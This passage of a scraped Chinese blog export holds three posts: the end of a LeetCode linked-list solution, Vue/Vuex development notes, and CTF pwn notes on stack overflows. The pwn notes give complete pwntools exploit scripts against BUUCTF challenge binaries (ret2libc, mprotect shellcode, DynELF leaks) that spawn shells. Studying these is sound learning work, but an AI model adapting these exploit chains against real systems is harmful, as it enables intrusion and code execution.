cur.left = pre ； 保存 cur ： 更新 pre = cur ，即节点 cur 是后继节点的 pre ； 递归右子树，即 dfs (cur.right) ； treeToDoublyList(root)： 特例处理： 若节点 root 为空，则直接返回； 初始化： 空节点 pre ； 转化为双向链表： 调用 dfs (root) ； 构建循环链表： 中序遍历完成后，head 指向头节点， pre 指向尾节点，因此修改 head 和 pre 的双向节点引用即可； 返回值： 返回链表的头节点 head 即可； 123456789101112131415161718192021class Solution {public: Node* treeToDoublyList(Node* root) { if(root == nullptr) return nullptr; dfs(root); head-&gt;left = pre; pre-&gt;right = head; return head; }private: Node *pre, *head; void dfs(Node* cur) { if(cur == nullptr) return; dfs(cur-&gt;left); if(pre != nullptr) pre-&gt;right = cur; //用pre来查找 else head = cur; //找到头结点 cur-&gt;left = pre; pre = cur; dfs(cur-&gt;right); }}; 复杂度分析： 时间复杂度 O (N)： N 为二叉树的节点数，中序遍历需要访问所有节点。 空间复杂度 O (N) ： 最差情况下，即树退化为链表时，递归深度达到 N，系统使用 O (N) 栈空间。","link":"/2022/01/27/leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"title":"vue开发问题总结","text":"vue 开发中遇到的一些问题及解决方法 # 一、前后端跨域接口实现 # 1、安装 axios 插件并设置全局 1npm install axios --save-dev 安装完成后对 axios 进行全局调用，在 main.js 中设置 12import axios from 'axios'Vue.prototype.$axios = axios # 2、设置跨域代理 在 config 文件夹的 index.js 文件中 (或者是在 vue.config.js 中），设置 proxy 模块代理，之后重启项目 12345678910111213141516171819devServer: { port: port, open: true, overlay: { warnings: false, errors: true }, // before: require('./mock/mock-server.js') proxy: { [process.env.VUE_APP_BASE_API]: { target: 'http://0.0.0.0:8000/', // 用于本地调试 // target: '', // 用于生产环境 changeOrigin: true, pathRewrite: { ['^' + process.env.VUE_APP_BASE_API]: '' } } }}, # 3、 发送请求 在 src 的 views 文件夹中创建 test.vue 文件，在文件中进行编写，这里只介绍 js 部分，在 method 方法中设置接口，如下: 1234567891011121314151617181920212223loopResult (data) { const self = this; let e; self.axios.get( '/index/start/' ).then(res =&gt; { // 根据状态码判断是否跨域成功 if (res.data.recode === 2000) { var jsonObj = JSON.parse(JSON.stringify(res.data)); // 解析json数据 jsonObj = jsonObj.data; console.log(self.tableData[i].text_id); } } else { alert('获取数据失败'); } } ).catch(err =&gt; { console.log(err); }); }, 这样便可以调用 data 中声明的变量对应数据，从而在页面显示出来。 123456789101112export default { data() { return { page: 1, offset: 10, totalNum: 1000, tableData: [] } },} 也可以将异步方法封装成 spider.js, 如 在 request.js 中，可以改 VUE_APP_BASE_API 为想要的值 # 二、 动态表格实现 在 vue 的 template 中引入 el-table，props 对应后端传来的 json 数组中元素的名称 # 三、vue - 将数据存入 vuex 中以及从 vuex 中取出数据 转载自：https://juejin.cn/post/7025522047988006925#heading-8 Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。简单来说就是：应用遇到多个组件共享状态时，使用 vuex。 # vuex 的五个核心概念： State：共享状态，vuex 的基本数据，用来存储变量，相当于组件 data 里的数据，只不过此时变成了全局变量。 Getter：基于 state 的派生状态，相当于组件中的 computed 中的属性。 Mutation：更改 vuex 中 store 共享状态的方法，通过提交 mutation 来去修改状态，进行同步操作数据，通常用于 action 获取异步数据，获取通过 commit 提交数据给 mutation，在 mutation 同步操作 state 中的数据。 action：支持异步操作，可用于异步获取请求中的数据，并将获取的数据同步 commit 提交给 mutation，实现 ajax 异步请求数据，mutation 将其数据同步到 state 中。 modules：模块化 vuex，为了方便后期对于项目的管理，可以让每一个模块拥有自己的 state、mutation、action、getters, 使得结构非常清晰，方便管理。 优势和劣势有哪些？ 优势主要就是可以全局共享数据，方法。方便统一管理 劣势的话，页面刷新后 state 的变量都会还原清空，不会像 cookies 一样持久性存储 页面刷新后 vuex 的 state 数据丢失怎么解决？ 先说一下为什么会丢失呢？ 因为 store 里的数据是保存在运行内存中的，当页面刷新时页面会重新加载 vue 实例，store 里面的数据就会被重新赋值 如何避免？ 其实主要还是看使用的场景是怎样的，如果想某些数据持久性保留也可以搭配使用 cookies 或者 localStorage。比如一些登录的信息等。 比如请求拿到了登录信息后可以先存在 localStorage，将 state 里的变量值和 sessionStorage 里面的绑定，mutations 中修改的时候同时修改 state 和 localStorage。最后页面直接使用 vuex 中的变量。 # 正式进入使用 vuex 的安装 打开终端，输入命令行 npm install vuex --save 进行下载 vuex # vuex 应用核心管理仓库 构建 store 这里新建 store 文件夹，创建一个 js 取名为 index.js， 在 index 里 ，通过将 state,mutations,actions,getters 引入到 store 中，并暴露出 store 对象。 下面为 index.js 的代码 12345678910111213141516171819202122/* vuex最核心的管理对象 store*/import Vue from 'vue';import Vuex from 'vuex'; // 分别引入这四个文件 这四个文件的内容和用法在下面分别讲到import state from './state';import mutations from './mutations';import actions from './actions';import getters from './getters'; //声明使用插件Vue.use(Vuex)//new 一个Vuex的对象,将state,mutation,action,getters配置到vuex的store中,方便管理数据export default new Vuex.Store({ state, mutations, actions, getters,}) 挂载 store 到 vue 实例上 main.js 中 12345678import store from './store'// ..........new Vue({ el: '#app', router, store, // *** render: h =&gt; h(App)}) # state 状态管理数据 我们通常将需要进行管理的共享数据，放入 state 中，使其形似为全局变量，对于需要的组件进行引入该 state 状态数据。 12345678910const state = { userId: '', token: '', name: '', avatar: '', introduction: '', roles: [], tenantId: 1, userInfo: null}; # mutations 同步提交数据 mutations 用于更改 state 中的状态逻辑的，且为同步更改 state 中的状态数据。 需要知道的是在 vuex 中只能通过 mutation 来去修改 state 对象， 可以通过获取 actions 获取到的数据去修改 state, 也可以在 mutations 模块中直接定义方法来去更改状态数据。 1234567891011121314151617181920const mutations = { SET_TOKEN: (state, token) =&gt; { state.token = token; }, SET_USERID: (state, userId) =&gt; { state.userId = userId; }, SET_NAME: (state, name) =&gt; { state.name = name; }, SET_ROLES: (state, roles) =&gt; { state.roles = roles; }, SET_TENANTID: (state, roles) =&gt; { state.tenantId = roles; }, SET_USER_INFO: (state, userInfo) =&gt; { state.userInfo = userInfo; }}; 通过 mutations 和下面的 actions 模块，大家也可以看出 commit 是用于调用 mutation 模块中的。 在组件中调用其 mutation 模块的代码为： 1this.$store.commit('SET_TOKEN', token_data) # actions 的异步操作 actions 与其 mutations 类似，但其可以进行异步操作， 且将异步操作获取的数据提交给 mutations，使得 mutations 更改 state 中的状态数据，这里常常用于获取 ajax 请求中的数据 (因为是异步)，并将其获取的数据 commit 提交给 mutations 使得 state 数据状态的更新。 和 mutations 的不同之处在于： Action 提交的是 mutation，而不是直接变更状态。 Action 可以包含任意异步操作。 举例 1234567891011121314151617181920212223242526272829303132333435363738/* 下面就是通过actions执行异步Ajax请求，得到数据后，通过commit的方法调用mutations 从而更新数据例如： commit('SET_TOKEN', data.uuid);*/const actions = { login({ commit }, userInfo) { // 用户登录 const params = userInfo; params.userName = userInfo.userName.trim() return new Promise((resolve, reject) =&gt; { getLogin(params) .then((response) =&gt; { const { status, message, data } = response || {}; if (status === 200) { // 存入 参数： 1.调用的值 2.所要存入的数据 commit('SET_USER_INFO', data); commit('SET_TOKEN', data.uuid); commit('SET_USERID', data.id); commit('SET_ROLES', data.roles); commit('SET_NAME', data.realName); commit('SET_TENANTID', data.tenantId || 1); setToken(data.uuid); db.save('userInfo', data); db.save('tenantId', data.tenantId || 1); localStorage.setItem('loginToken', data.uuid); resolve(data); } else { // ElementUI.Message.error(message); // axios拦截统一提示了 } }) .catch((error) =&gt; { // ElementUI.Message.error(error.message); // axios拦截统一提示了 reject(error); }); }); },} 这个 actions 在组件中的调用方法就是： 123456 this.$store.dispatch('user/login', postUser) .then(res =&gt; { // ............. })// 我这里的login方法写在了user.js这个module里 所以这里调用是 user/login// 下面会讲到module # Getters 对 state 进行加工 Getters 相当于 computed 计算属性，用于加工处理 state 状态数据，有其两个默认参数，第一个默认参数为 state，第二个默认参数为 getters。 123456789const getters={ plusCount(state){ return state.count + 1 }, //获取state中状态数据对象，和获取getters模块中plusCount数据 totalCount(state,getters){ return getters.plusCount + state.count }} 在组件中调用该方法的代码片段为： 1this.$store.getters.totalCount() # 在 Vue 组件中获得 Vuex 状态 从 store 实例中读取状态最简单的方法就是在计算属性中返回某个状态，由于 Vuex 的状态存储是响应式的，所以在这里每当 store.state.count 变化的时候，都会重新求取计算属性，进行响应式更新。 12345computed: { count: function(){ return this.$store.state.count } }, 那么对于以上的 store 我们就简单介绍完了，相信大家看完后对于 vuex 会有一定的理解。那么这个时候我们要想，是不是使用 this.$store.state 或 this.$store.getters.xxx 感到麻烦呢？下面我们介绍另一种引入 state 和 getters 的方式 # 辅助函数 mapState 和 mapGetters 对于上述的在组件中引用 state 和 getters 的方法是不是感到麻烦呢？使用 mapState 你将会感受到便利。 组件中这样使用 12345678910111213141516171819202122//首先我们需要先将辅助函数引入import { mapGetters,mapState } from 'vuex' export default { computed: { // 使用对象展开运算符将 getter 混入 computed 对象中 ...mapGetters( ['plusCount','totalCount'] ) // 使用对象展开运算符将 state 混入 computed 对象中 ...mapState( ['userInfo','count'] ) },methods:{ getData(){ // 这里就能直接使用了 直接使用state 和getters里的数据 // this.userInfo // this.plusCount }}} # Module 子模块化管理 store 文件夹下的 index.js 代码如下 1234567891011121314151617181920212223import Vue from 'vue'import Vuex from 'vuex'import getters from './getters'Vue.use(Vuex)const modulesFiles = require.context('./modules', true, /\\.js$/)const modules = modulesFiles.keys().reduce((modules, modulePath) =&gt; { const moduleName = modulePath.replace(/^\\.\\/(.*)\\.\\w+$/, '$1') const value = modulesFiles(modulePath) modules[moduleName] = value.default return modules}, {})const store = new Vuex.Store({ modules, getters})export default store 文件目录如图 举例 api.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192import { getKey, getLogin, logout, getInfo } from '@/api/user';import { setToken, removeToken } from '@/utils/auth';import db from '@/utils/localstorage';import router, { resetRouter } from '@/router';import ElementUI from 'element-ui';const state = { userId: '', token: '', name: '', avatar: '', introduction: '', roles: [], tenantId: 1, userInfo: null // roles: ['9999']};const mutations = { SET_TOKEN: (state, token) =&gt; { state.token = token; }, SET_USERID: (state, userId) =&gt; { state.userId = userId; }, SET_NAME: (state, name) =&gt; { state.name = name; }, SET_ROLES: (state, roles) =&gt; { state.roles = roles; }, SET_TENANTID: (state, roles) =&gt; { state.tenantId = roles; }, SET_USER_INFO: (state, userInfo) =&gt; { state.userInfo = userInfo; }};const actions = { // 获取密钥 getKey({ commit }) { return new Promise((resolve, reject) =&gt; { getKey() .then((response) =&gt; { resolve(response); }) .catch((error) =&gt; { reject(error); }); }); }, // 用户登录 login({ commit }, userInfo) { // const { username, password } = userInfo; const params = userInfo; params.userName = userInfo.userName.trim() return new Promise((resolve, reject) =&gt; { // console.log(username, password); // setToken(state.token) // localStorage.setItem('loginToken', state.token) getLogin(params) // getLogin({ userName: username.trim(), password: password }) .then((response) =&gt; { const { status, message, data } = response || {}; if (status === 200) { // 存入 参数： 1.调用的值 2.所要存入的数据 commit('SET_USER_INFO', data); commit('SET_TOKEN', data.uuid); commit('SET_USERID', data.id); commit('SET_ROLES', data.roles); commit('SET_NAME', data.realName); commit('SET_TENANTID', data.tenantId || 1); setToken(data.uuid); db.save('userInfo', data); db.save('tenantId', data.tenantId || 1); localStorage.setItem('loginToken', data.uuid); resolve(data); } else { // ElementUI.Message.error(message); // axios拦截统一提示了 } }) .catch((error) =&gt; { // ElementUI.Message.error(error.message); // axios拦截统一提示了 reject(error); }); }); }, // 获取用户信息 getInfo({ commit, state }) { return new Promise((resolve, reject) =&gt; { getInfo(state.token) .then((response) =&gt; { const { data } = response; data.roles = response.data.rights.map(String); if (!data) { reject('验证失败，请重新登录。'); } const loginMessage = { memberId: data.id, userName: data.name, userTel: data.mobile, realName: data.realName, incorCom: data.incorCom, virtualCor: data.virtualCor, deptId: data.deptId, deptpath: data.deptpath, deptName: data.deptName }; localStorage.setItem('loginMessage', JSON.stringify(loginMessage)); const { id, roles, realName } = data; // 角色必须是非空数组! if (!roles || roles.length &lt;= 0) { reject('getInfo: 角色必须是非空数组!'); } commit('SET_USERID', id); commit('SET_ROLES', roles); commit('SET_NAME', realName); localStorage.setItem('userRights', roles); // commit('SET_AVATAR', avatar) // commit('SET_INTRODUCTION', introduction) resolve(data); }) .catch((error) =&gt; { reject(error); }); }); }, // 用户登出 logout({ commit, state }) { return new Promise((resolve, reject) =&gt; { logout(state.token) .then(() =&gt; { commit('SET_TOKEN', ''); commit('SET_ROLES', []); db.remove('router'); removeToken(); resetRouter(); resolve(); }) .catch((error) =&gt; { reject(error); }); }); }, // 删除token resetToken({ commit }) { return new Promise((resolve) =&gt; { commit('SET_TOKEN', ''); commit('SET_ROLES', []); removeToken(); resolve(); }); }, // 动态修改权限 changeRoles({ commit, dispatch }, role) { return new Promise(async(resolve) =&gt; { const token = role + '-token'; commit('SET_TOKEN', token); setToken(token); const { roles } = await dispatch('getInfo'); console.log(roles, 'rolesrolesroles'); resetRouter(); // 根据角色生成可访问路由映射 const accessRoutes = await dispatch('permission/generateRoutes', roles, { root: true }); // 动态添加可访问路由 router.addRoutes(accessRoutes); // 重置已访问视图和缓存视图 dispatch('tagsView/delAllViews', null, { root: true }); resolve(); }); }};export default { namespaced: true, state, mutations, actions}; 这样后可以按功能分 module 使用 页面中调用就是 1234567891011// 使用mutationsthis.$store.commit('api/SET_T', keys);// 使用actionsthis.$store.dispatch('user/login', postUser).then(res =&gt; {}）// 如果没有分module // 那就是 this.$store.commit('SET_T', keys);// 直接调用方法 # 四、解决 vuex 中刷新数据，数据消失问题 # 解决方法 # 操作 在自定义的 waiter.js 中加入 sessionStorage 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import {searchSpiderTask} from &quot;@/api/spider&quot;;const state = { // authInfo: JSON.parse(sessionStorage.getItem(&quot;COMPANY_AUTH_INFO&quot;)) || {} tableData: JSON.parse(sessionStorage.getItem(&quot;tableData&quot;)) || [], count: 0, title:'首页', // tableData:[],}const getters = { // tableData: state =&gt; state.tableData,}const mutations = { // change:(state,text)=&gt;{ // state.title=text; // }, // add:(state)=&gt;{ // state.count++ // }, GET__tableData(state,data){ state.tableData=data //数据更改 sessionStorage.setItem(&quot;tableData&quot;, JSON.stringify(state.tableData)) //存sessionStorage },}const actions={ getList(context){ searchSpiderTask().then( res=&gt;{ console.log(res.data); context.commit('GET__tableData',res.data); //传后端数据 } ) } }export default { namespaced: true, state, getters, mutations, actions,} 在对应的 vue 中 123456789101112131415161718192021//触发方法&lt;el-button type=&quot;primary&quot; plain @click=&quot;loopResult&quot; style=&quot;margin-left: 10px&quot;&gt;检查&lt;/el-button&gt;//method部分loopResult(data){ this.$store.dispatch('waiter/getList') //传actions searchSpiderTask().then(response =&gt; { console.log(response.code) if(response.code===20000) { const h = this.$createElement this.$notify({ title: '搜索成功', message: h('i', {style: 'color: teal'}, '搜索成功'), duration: 1000 }) } }).catch(err =&gt; { console.log(err) }) }, # 五、一些其他问题的解决方法 报错：[vuex] unknown action type:***","link":"/2022/03/07/vue%E5%BC%80%E5%8F%91%20(1)/"},{"title":"栈溢出","text":"ret2libc，fmtstr # 一。基础知识补充 指令指针寄存器，是存放下次将要执行的指令在代码段的偏移量，RIP、EIP、IP (Instruction Pointer) 分别为 64 位、32 位、16 位指令指针寄存器 以 64 位程序为例: 在执行 call 指令的时候，会向栈中压入 call 指令完成后下一条指令的地址，之后跳转到被调用的函数开始执行 push rbp ; 将父函数栈底压入栈中 mov rbp, rsp ; 将父函数栈顶变为子函数栈底 sub rsp, 0x70 ; 向低地址处为子函数开辟栈帧 在函数调用结束的时候，程序会执行这两条指令 leave 指令相当于执行了如下两条指令 mov esp ebp pop ebp ret 指令则可以理解为将栈中的返回地址 pop 给 rip 的操作，从而回到父函数继续执行 # 二. ret2text 栈溢出函数：strcpy 程序本身存在 fflush 函数，我们可以直接用它的 sh 来当作 system 的参数 # 三. ret2libc # 泄露 libc 利用思路： 利用 write 函数来泄露程序的 libc 版本 知道 libc 版本后去计算程序里的 system 函数和字符串 “/bin/sh” 的地址 覆盖返回地址为 system（‘/bin/sh’），获取 shell # 例题：2018_rop 1: 12345payload='a'*(0x88+4)+p32(write_plt)+p32(main)+p32(0)+p32(write_got)+p32(4)r.sendline(payload)write_addr=u32(r.recv(4)) # 获取write函数地址libc=LibcSearcher('write',write_addr) 首先填充‘a’*（0x88+4）造成溢出，覆盖到返回地址，返回地址填上 write 函数的 plt 地址来调用 write 函数，之后跟上 main 函数地址（我们要将程序程序重新执行一遍，再次利用输入点来进构造 rop） p32（0）+p32 (write_addr)+p32 (4) 是在设置 write 函数的参数，对应函数原型看一下，32 位程序是 4 位，所以这边写的 4，对应的 64 位程序是 8 位。 2: 1234offset=write_addr-libc.dump('write') #计算偏移量 #偏移量=程序里的函数地址-libc里的函数地址system_addr=offset+libc.dump('system')bin_sh=offset+libc.dump('str_bin_sh') 3: 构造 rop 获取 shell 1payload='a'*(0x88+4)+p32(system_addr)+p32(0)+p32(bin_sh) 完整 exp: 1234567891011121314151617181920212223242526from pwn import *from LibcSearcher import *r=remote('node3.buuoj.cn',27043)elf=ELF('./2018_rop')write_plt=elf.plt['write']write_got=elf.got['write']main=elf.sym['main']payload='a'*(0x88+4)+p32(write_plt)+p32(main)+p32(0)+p32(write_got)+p32(4)r.sendline(payload)write_addr=u32(r.recv(4))libc=LibcSearcher('write',write_addr)offset=write_addr-libc.dump('write')system_addr=offset+libc.dump('system')bin_sh=offset+libc.dump('str_bin_sh')payload='a'*(0x88+4)+p32(system_addr)+p32(0)+p32(bin_sh)r.sendline(payload)r.interactive() 但是我在这么写的时候出现了 timeout: the monitored command dumped core , 尝试泄露 read 函数的真实地址，再调用 read 函数来找到偏移。(后来找到问题有：payload 的顺序错误也会导致 timeout 和找不到 libc,timeout 对应 payload: 填充 + got 表 + plt 表 + main，找不到 libc 对应 payload: 填充 + pop_rdi_ret+binsh_system, 对应 64 位栈溢出，32 位和 64 位不同) 64 位查找 pop_rdi: 1ROPgadget --binary bjdctf_2020_babyrop |grep &quot;pop rdi&quot; exp: 1234567891011121314151617181920212223from pwn import *from LibcSearcher import *elf = ELF(&quot;./2018_rop&quot;)p = remote(&quot;node3.buuoj.cn&quot;,28628)read_plt = elf.plt['read']read_got = elf.got['read']write_plt = elf.plt['write']main_addr = 0x080484C6payload = 'a' * (0x88 + 0x4) payload += p32(write_plt) + p32(main_addr)payload += p32(1) + p32(read_got) + p32(8)p.sendline(payload)read_addr = u32(p.recv(4))print hex(read_addr)libc = LibcSearcher(&quot;read&quot;, read_addr)libc_base = read_addr - libc.dump(&quot;read&quot;)sys_addr = libc_base + libc.dump(&quot;system&quot;)binsh = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = 'a' * (0x88 + 0x4)payload += p32(sys_addr) + p32(0) + p32(binsh)p.sendline(payload)p.interactive() LibcSearcher 使用方法：将 exp 放在 libcsearcher 的安装目录下 12345678910111213141516171819202122232425# coding:utf-8from pwn import*from LibcSearcher import*p=remote('node3.buuoj.cn','25295')elf=ELF('./1')main=0x400b28rdi=0x400c83ret=0x4006b9pus_plt=elf.plt['puts']puts_got=elf.got['puts']p.sendlineafter('Input your choice!\\n','1')payload='\\0'+'a'*(0x50-1+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.sendlineafter('Input your Plaintext to be encrypted\\n',payload)p.recvline()p.recvline() #接收 encrypt 的两个 puts函数输出;puts_addr=u64(p.recvuntil('\\n')[:-1].ljust(8,'\\0')) #得到 puts 函数 的地址;libc=LibcSearcher(&quot;puts&quot;,puts_addr) # 得到 libc的版本;libc_base=puts_addr-libc.dump(&quot;puts&quot;) # 得到偏移地址sys_addr=libc_base+libc.dump(&quot;system&quot;) # 利用偏移地址 得到 system函数的地址binsh=libc_base+libc.dump(&quot;str_bin_sh&quot;) # 得到 bin/sh 的 地址p.sendlineafter('choice!\\n','1') # 再一次执行 一遍流程payload='\\0'+'a'*(0x50-1+8)+p64(ret)+p64(rdi)+p64(binsh)+p64(sys_addr)p.sendlineafter('encrypted\\n',payload)p.interactive() plt 表 -》got 表 # 四。利用 mprotect 修改内存权限 mprotect 函数，可以用它来修改我们，内存栈的权限，让它可读可写可执行，进而修改内存权限。 # ROPgadget 使用 例题：not_the_same_3dsctf_2016 利用 mprotect 函数修改 bss 段为 0x7 即 0b111 ，可读可写可执行权限，然后利用 read 函数读入 shellcode，最后跳转到 shellcode 的位置 1ROPgadget --binary not_the_same_3dsctf_2016--only &quot;pop|ret&quot;|grep pop 需要利用 ret 指令控制程序，所以这里需要借助用来设置三个参数的三个寄存器命令，p3_ret=0x806fcc8 ctrl+s 调出程序的段表，将.got.plt 段改为可读可写可执行，addr=0x80eb000 将返回地址填写成 read 函数，设置 read 函数的参数，之后将返回地址改为我们修改为可读可写可执行的地址，最后读入 shellcode 12345678910111213141516171819202122232425# mprotect函数的利用，将目标地址：.got.plt或.bss段 修改为可读可写可执行int mprotect(const void *start, size_t len, int prot);argu1 为mprotect函数的第一个参数 (被修改内存的地址) 设置为 0x0x80EB000 (ida-ctrl+s 查看.got.plt/.bss起始地址) argu2 为mprotect函数的第二个参数 (被修改内存的大小) 设置为 0x1000 (0x1000通过程序启动时查看该内存块的大小的到的)argu3 为mprotect函数的第三个参数 (被修改内存的权限) 设置为 7 = 4 + 2 +1 (rwx)elf = ELF('./pwn')# ROPgadget --binary get_started_3dsctf_2016 --only 'pop|ret' | grep poppop3_addr = 0x0806fcc8 # pop esi ; pop ebx ; pop edx ; retpayload = 0x2D * 'a' + 0x4 * 'b' + p32(elf.symbols['mprotect'])payload += p32(pop3_addr) # 返回地址覆盖为pop3，目的为了栈还原，因为mprotect传入了三个参数，需要连续3个poppayload += p32(argu1) + p32(argu2) + p32(argu3)# 紧接着返回地址为 read对修改的目标地址写入shellcodepayload += p32(elf.symbols['read']) payload += p32(pop3_addr) # 同样栈还原，为了执行紧接着的 目标地址payload += p32(0) + p32(argu1) + p32(0x100)# read写完后 写入执行的目标地址payload += p32(argu1)# 先进行sendline执行到read等待输入sh.sendline(payload)# 继续sendline发送shellcodesh.sendline(asm(shellcraft.sh(), arch = 'i386', os = 'linux'))# 进入交互模式sh.interactive() 完整 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#coding:utf-8from pwn import*context.log_level = 'debug'context(arch='i386', os='linux')local = 0proc_name = './not_the_same_3dsctf_2016'elf = ELF(proc_name)# 这道题本地和远程两种解法，真的干。。。if local: sh = process(proc_name) str_flag_addr = 0x080ECA2D backdoor_addr = 0x080489A0 printf_addr = 0x0804F0A0 payload = 0x2D * 'a' # 这边不用覆盖ebp,在于get_flag并没有push ebp payload += p32(backdoor_addr) + p32(printf_addr) payload += p32(str_flag_addr) sh.sendline(payload)else: sh = remote('node3.buuoj.cn', 28308) mprotect_addr = elf.symbols['mprotect'] read_addr = elf.symbols['read'] pop3_edi_esi_ebx_ret = 0x0806fcc8 mem_addr = 0x080EB000 #.got.plt 的起始地址 mem_size = 0x1000 mem_type = 0x7 # 可执行权限 payload = 0x2D * 'a' payload += p32(mprotect_addr) payload += p32(pop3_edi_esi_ebx_ret) payload += p32(mem_addr) + p32(mem_size) + p32(mem_type) payload += p32(read_addr) payload += p32(pop3_edi_esi_ebx_ret) payload += p32(0) + p32(mem_addr) + p32(0x100) payload += p32(mem_addr) #将read函数的返回地址设置到我们修改的内存的地址，之后我们要往里面写入shellcode sh.sendline(payload) # read写入shellcode payload = asm(shellcraft.sh()) sh.sendline(payload)sh.interactive() # 五. 32 位，64 位栈溢出对比 32 位的函数在调用栈的时候是： 调用函数地址(父函数的栈底地址）-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1....-&gt;参数1 由于在函数调用前通过 push 指令向栈中压入了数据，使得栈顶朝低地址偏移了所以在函数调用结束以后，要有恢复栈顶的过程：将通过 add esp 0x10 这条指令，即增加 esp 来恢复函数调用前的 esp。 64 位的函数在调用栈的时候是： 前六个参数按照约定存储在寄存器：rdi,rsi,rdx,rcx,r8,r9中。 参数超过六个的时候，第七个会压入栈中，并且先输入函数的返回地址，然后是函数的参数，之后才是函数的调用地址 # 六。覆盖相关变量 ebp ret_addr 虚函数指针 ​ 子类对父类的继承 ​ 能够对函数进行重写 ​ 由虚函数表来进行操作 SEH 链 ​ SEH 结构 结构 在栈中存在的 地方 ，在 在 ret_addr 和栈中数据之间 和栈中数据之间，这就导致了对于栈的安全防护 手段 ， 难以防护针对 防护针对 SEH 链的攻击 Hook 中的变量 利用方法介绍  有些系统函数有预先定义好的钩子  修改钩子链表中存储的子程序指针 影响钩子运行 fgets 的用法的时候，发现它能够避免造成溢出 程序自带的 system 函数地址 timeout: the monitored command dumped core 解决 1) 在 payload 后面加几个 ret 地址，或者加一个假的 0xdeadbeef 1p = flat(['a'*0x10, 'b'*8, pop_di, bin_sh_addr, system, 0xdeadbeef]) 2) 直接用系统函数的地址 # 七. BUUCTF 例题 # 1. JarvisOJ level4 # 知识点 参考文章：借助 DynELF 实现无 libc 的漏洞利用小结 pwntools 中 DynELF 函数使用 (针对未给出 libc 文件) 123456789def leak(address): payload=pad+p32(writeplt)+ret1+p32(1)+p32(address)+p32(4) io.sendline(payload) leak_sysaddr=io.recv(4) #print &quot;%#x =&gt; %s&quot; % (address, (leak_sysaddr or '').encode('hex')) 这里是测试用，可省略。 return leak_sysaddrd = DynELF(leak, elf=ELF(&quot;对应文件&quot;))sysaddr=d.lookup(&quot;system&quot;,&quot;libc&quot;) pad 为填充，ret1 为有效的返回地址 # WP 开了 NX 保护（堆栈不可执行） 利用 DynELF 泄露 system 地址，通过 read 函数写入 /bin/sh 到 bss 段 exp: 123456789101112131415161718192021222324from pwn import *conn=process('./level4')e=ELF('./level4')pad=0x88write_plt=e.plt['write']vul_addr=0x804844bbss_addr=0x0804a024def leak(address): payload1='a'*0x8c+p32(write_plt)+p32(vul_addr)+p32(1)+p32(address)+p32(4) conn.sendline(payload1) data=conn.recv(4) return data d=DynELF(leak,elf=e)system_addr=d.lookup('system','libc')print hex(system_addr)read_plt=e.plt['read']payload2='a'*0x8c+p32(read_plt)+p32(vul_addr)+p32(0)+p32(bss_addr)+p32(8)conn.sendline(payload2)conn.send(&quot;/bin/sh&quot;)payload3=&quot;a&quot;*0x8c+p32(system_addr)+p32(0xdeadbeef)+p32(bss_addr)conn.sendline(payload3)conn.interactive() 常规解法: 123456789101112131415161718192021222324252627282930#coding=utf-8from pwn import *from LibcSearcher import *context(os = &quot;linux&quot;, arch = &quot;i386&quot;, log_level= &quot;debug&quot;)p = remote(&quot;node4.buuoj.cn&quot;, 25934)elf = ELF(&quot;./level4&quot;)read_got = elf.got[&quot;read&quot;]write_plt = elf.plt[&quot;write&quot;]main_addr = elf.symbols[&quot;main&quot;]payload = &quot;a&quot; * 0x8c + p32(write_plt)payload += p32(main_addr)payload += p32(1) + p32(read_got) + p32(4)p.sendline(payload)read_addr = u32(p.recvuntil(&quot;\\xf7&quot;)[-4:])libc = LibcSearcher(&quot;read&quot;, read_addr)libc_base = read_addr - libc.dump(&quot;read&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = &quot;a&quot; * 0x8c + p32(system_addr)payload += p32(main_addr)payload += p32(binsh_addr)p.sendline(payload)p.interactive() # jarvisoj_level3_x64 64 位 ret2libc（no canary found) checksec 泄露 libc 64 位汇编传参，当参数少于 7 个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。 当参数为 7 个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和 32 位汇编一样。 我们这边要利用 write 函数去泄露 libc 版本 write 函数的原型，它有三个参数，所以我们这边需要用到三个寄存器去传参 123456ssize_t write(int fd,const void*buf,size_t count);参数说明： fd:是文件描述符（write所对应的是写，即就是1） buf:通常是一个字符串，需要写入的字符串 count：是每次写入的字节数 利用 ROPgadget 寻找 rdi,rsi 寄存器地址 WP: 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from LibcSearcher import *r=remote('node4.buuoj.cn',26919)# r = process('./level3_x64')context(os = &quot;linux&quot;, arch = &quot;amd64&quot;, log_level= &quot;debug&quot;)elf=ELF('./level3_x64')#libc=ELF('./libc-2.19.so')write_plt=elf.plt['write']write_got=elf.got['write']main=0x40061Ardi=0x4006b3rsi_r15=0x4006b1payload='a'*(0x80+8)+p64(rdi)+p64(1) #rdi寄存器设置write函数的第一个参数为‘1’payload+=p64(rsi_r15)+p64(write_got)+p64(8) #rsi寄存器设置write函数的第二个参数为write_got表的地址，r15寄存器设置write函数的第三个参数为8payload+=p64(write_plt) #去调用write函数payload+=p64(main) #控制程序流，回到main函数，继续控制r.sendlineafter('Input:',payload)write_addr=u64(r.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))#write_addr=u64(r.recvuntil('\\n')[:-1].ljust(8,'\\0'))print hex(write_addr)libc=LibcSearcher('write',write_addr)libc_base=write_addr-libc.dump('write')system_addr=libc_base+libc.dump('system')binsh=libc_base+libc.dump('str_bin_sh')payload='a'*(0x80+8)+p64(rdi)+p64(binsh)+p64(system_addr)r.sendlineafter('Input:',payload)r.interactive() # bjdctf_2020_babyrop2 程序结构 init（） gift（） vuln（） 在 gift 函数处存在格式化字符串漏洞，可以用来泄露 libc 在 vuln 函数处存在 buf 溢出漏洞，绕过 canary 